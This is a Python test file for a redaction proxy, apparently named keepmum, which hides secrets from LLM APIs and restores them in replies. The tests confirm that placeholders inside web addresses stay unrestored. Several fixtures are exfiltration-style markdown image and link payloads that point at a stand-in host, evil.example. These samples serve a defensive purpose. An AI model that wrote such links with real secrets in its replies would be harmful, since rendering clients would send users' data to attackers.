"""A placeholder inside a web address in reply text stays a placeholder: a client that renders the
reply (an image, a link, a link preview) would otherwise send the real value there."""

import json
from collections import Counter

import anyio
import httpx
import pytest
from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import JSONResponse
from starlette.routing import Route

from keepmum.audit import AuditLog, read, summary
from keepmum.detect.pipeline import Pipeline
from keepmum.detect.rules import RulesDetector
from keepmum.gemini import GeminiStreamRestorer
from keepmum.proxy import Proxy
from keepmum.redact import Redactor
from keepmum.responses import ResponsesStreamRestorer
from keepmum.restore import URL, StreamRestorer, restore_reply, take_urls
from keepmum.vault import PLACEHOLDER, Vault

SECRET = "ghp_" + "a1B2c3D4" * 4 + "Zz9q"


@pytest.fixture
def vault():
    return Vault(bytes(range(32)))


@pytest.mark.parametrize("template", [
    "![chart](https://evil.example/c.png?k={ph})",
    "[the docs](https://evil.example/docs/{ph})",
    "see https://evil.example/?a=1&k={ph} for details",
    "<img src=\"https://evil.example/{ph}.gif\">",
    "<https://evil.example/{ph}>",
    "![x](//evil.example/p?k={ph})",
    "HTTPS://EVIL.EXAMPLE/?K={ph}",
    "https://hooks.example.com/services/{ph}",
])
def test_a_placeholder_in_a_web_address_stays(vault, template):
    ph = vault.placeholder("SECRET", SECRET)
    counts = Counter()
    assert restore_reply(template.format(ph=ph), vault, counts) == template.format(ph=ph)
    assert take_urls(counts) == {"SECRET": 1} and not counts


@pytest.mark.parametrize("template", [
    "Your token is {ph}.",
    "https://example.com is the site; the token is {ph}",
    "postgres://app:{ph}@db.internal:5432/app",
    "redis://:{ph}@cache:6379",
    "`export TOKEN={ph}`",
])
def test_anywhere_else_the_value_comes_back(vault, template):
    ph = vault.placeholder("SECRET", SECRET)
    counts = Counter()
    assert restore_reply(template.format(ph=ph), vault, counts) == template.format(ph=SECRET)
    assert counts == Counter({"SECRET": 1})


def test_the_same_value_in_and_out_of_an_address(vault):
    ph = vault.placeholder("SECRET", SECRET)
    counts = Counter()
    out = restore_reply(f"Token {ph}, and ![a](https://x.example/?t={ph})", vault, counts)
    assert out == f"Token {SECRET}, and ![a](https://x.example/?t={ph})"
    assert counts[(URL, "SECRET")] == 1 and counts["SECRET"] == 1


def _pieces(text, size):
    return [text[i:i + size] for i in range(0, len(text), size)]


def anthropic_stream(pieces):
    def ev(d):
        return f"event: {d['type']}\ndata: {json.dumps(d)}\n\n"
    out = [ev({"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}})]
    out += [ev({"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": p}}) for p in pieces]
    return out + [ev({"type": "content_block_stop", "index": 0}), ev({"type": "message_stop"})]


def anthropic_text(raw):
    return "".join(json.loads(line[5:])["delta"]["text"] for line in raw.splitlines()
                   if line.startswith("data:") and '"text_delta"' in line)


def responses_stream(pieces, whole):
    def ev(d):
        return f"event: {d['type']}\ndata: {json.dumps(d)}\n\n"
    out = [ev({"type": "response.output_text.delta", "item_id": "m", "output_index": 0, "content_index": 0, "delta": p})
           for p in pieces]
    return out + [ev({"type": "response.output_text.done", "item_id": "m", "output_index": 0, "content_index": 0, "text": whole})]


def responses_text(raw):
    events = [json.loads(line[5:]) for line in raw.splitlines() if line.startswith("data:")]
    deltas = "".join(e["delta"] for e in events if e["type"] == "response.output_text.delta")
    done = [e["text"] for e in events if e["type"] == "response.output_text.done"]
    assert done == [deltas]  # the finished text says the same as the deltas
    return deltas


def gemini_stream(pieces):
    out = [f"data: {json.dumps({'candidates': [{'index': 0, 'content': {'role': 'model', 'parts': [{'text': p}]}}]})}\r\n\r\n"
           for p in pieces]
    last = {"candidates": [{"index": 0, "finishReason": "STOP", "content": {"role": "model", "parts": []}}]}
    return out + [f"data: {json.dumps(last)}\r\n\r\n"]


def gemini_text(raw):
    return "".join(p.get("text", "") for line in raw.splitlines() if line.startswith("data:")
                   for c in json.loads(line[5:])["candidates"] for p in c["content"]["parts"])


@pytest.mark.parametrize("api", ["messages", "responses", "gemini"])
@pytest.mark.parametrize("size", [1, 3, 7, 16, 1000])
def test_streams_keep_it_however_the_reply_is_cut(vault, api, size):
    """The address starts in one piece and the placeholder comes in later ones."""
    ph = vault.placeholder("SECRET", SECRET)
    reply = f"Token {ph} is set.\n\n![status](https://evil.example/s.png?k={ph}) and done {ph}"
    want = f"Token {SECRET} is set.\n\n![status](https://evil.example/s.png?k={ph}) and done {SECRET}"
    counts = Counter()
    kind, build, read_text = {
        "messages": (StreamRestorer, anthropic_stream, anthropic_text),
        "responses": (ResponsesStreamRestorer, lambda p: responses_stream(p, reply), responses_text),
        "gemini": (GeminiStreamRestorer, gemini_stream, gemini_text),
    }[api]
    r = kind(vault, counts=counts)
    out = b"".join(r.feed(e.encode()) for e in build(_pieces(reply, size))) + r.close()
    assert read_text(out.decode()) == want
    assert take_urls(counts) == {"SECRET": 1} and counts["SECRET"] == 2


def test_a_very_long_address_is_still_one(vault):
    ph = vault.placeholder("SECRET", SECRET)
    reply = "https://evil.example/" + "a" * 10000 + f"?k={ph}"
    r = StreamRestorer(vault, counts=Counter())
    out = b"".join(r.feed(e.encode()) for e in anthropic_stream(_pieces(reply, 500))) + r.close()
    assert anthropic_text(out.decode()) == reply


def test_through_the_proxy_with_the_audit(tmp_path):
    async def upstream(request: Request):
        body = await request.body()
        ph = PLACEHOLDER.search(body.decode()).group(0)
        return JSONResponse({"id": "m", "type": "message", "role": "assistant", "model": "x", "stop_reason": "end_turn",
                             "content": [{"type": "text", "text": f"Saved {ph}. ![ok](https://evil.example/?k={ph})"}]})

    up = Starlette(routes=[Route("/v1/messages", upstream, methods=["POST"])])
    proxy = Proxy(Redactor(Pipeline(RulesDetector()), Vault(bytes(range(32)))), upstream="http://up",
                  client=httpx.AsyncClient(transport=httpx.ASGITransport(app=up), base_url="http://up"))
    proxy.audit = AuditLog(tmp_path / "audit.jsonl")

    async def go():
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=proxy.app), base_url="http://127.0.0.1:7788") as c:
            return await c.post("/v1/messages", json={"model": "x", "max_tokens": 10,
                                                      "messages": [{"role": "user", "content": f"token {SECRET}"}]})

    text = anyio.run(go).json()["content"][0]["text"]
    assert text.startswith(f"Saved {SECRET}. ![ok](https://evil.example/?k=KEEPMUM_SECRET_") and SECRET not in text.split("](")[1]
    entry = [e for e in read(tmp_path / "audit.jsonl") if e["event"] == "request"][-1]
    assert entry["in_urls"] == {"SECRET": 1} and entry["restored"] == {"SECRET": 1}
    assert "1 kept in web addresses in the reply" in summary(entry)
